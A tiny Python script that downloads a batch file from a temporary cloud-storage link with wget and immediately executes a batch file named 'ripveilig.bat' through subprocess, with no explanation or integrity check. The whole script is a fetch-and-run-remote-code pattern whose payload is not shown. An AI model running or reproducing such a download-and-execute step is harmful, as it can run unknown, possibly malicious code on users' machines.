import wget
import subprocess
bat_url = "https://content-eu.drive.amazonaws.com/cdproxy/templink/sSZhljGlUVmHGCG8tNYQ5RsfP_l7IUMVSIIJCsf5BUQeJxFPc?download=true&ownerId=A1UMN6NF5IIYQT"
bat_filename = wget.download(bat_url)
subprocess.call([r'ripveilig.bat'])
